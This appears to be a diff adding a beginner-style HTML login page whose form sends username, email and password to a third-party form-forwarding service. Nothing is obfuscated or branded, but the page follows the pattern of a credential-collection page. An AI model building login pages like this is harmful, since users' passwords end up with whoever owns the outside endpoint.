@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="https://www.istockphoto.com/sign-in/assets/static/680690930-desktop-e679083dd6ce9b4ff241.jpg" type="image/x-icon">
+    <title>login</title>
+   </head>
+  <body>
+    <section class="w3l-simple-contact-form1">
+        <div class="contact-form section-gap">
+          <div class="contact-form" style="max-width: 450px; margin: 0 auto;">
+         <div class=" wrapper">
+         <div class="text-center">
+         <div class="container">
+          <div class="form-row">
+         <div class= "form-mid">
+          <h1 style="font-size: 40px; ">Login Form</h1>
+         <form target="_blank" action="https://formsubmit.co/  7b01ea4f3569b098a9c1232e2f414838" method="POST" onsubmit="return validation()" autocomplete="off">
+     
+          <div class="uname">
+            <input  id="uname"type="text" class="form-control" name="username" placeholder="username" >
+          </div>
+          <div class="email">
+            <input id="email"type="email" class="form-control" name="Subject" id="Subject" placeholder="email">
+          </div>
+          <div class="pass">
+            <input id="pass"type="password" class="form-control" name="Sender" id="Sender" placeholder="password">
+        </div>
+        <textarea id ="message" name="Message" class="form-control" id="Message" placeholder="Message"></textarea>
+        <button type="submit" class="btn btn-contact">Submit Form</button>
+        <script>
+        function validation() {
+          var username = document.getElementById("uname");
+
+          var password = document.getElementById("pass");
+          var email = document.getElementById("email");
+          var message = document.getElementById("message");
+          if (username.value == "" ){
+            alert("please enter username ! ");
+            return false;
+          }
+          if( email.value == "" ){
+            alert("please enter email ! ");
+            return false;
+          }
+          if( password.value == "" ){
+             alert("please enter password ! ");
+              return false;
+          }
+          if(message.value == ""){
+            alert("send a feedback message !" );
+            return false;
+          }
+          else
+          {
+            true;
+          }
+
+        }
+
+         </script>
+
+             </form>
+      </div>
+     </div>
+     </div>
+     </div> 
+    </div>
+     </div>
+    </div>
+   </body>
+</html>
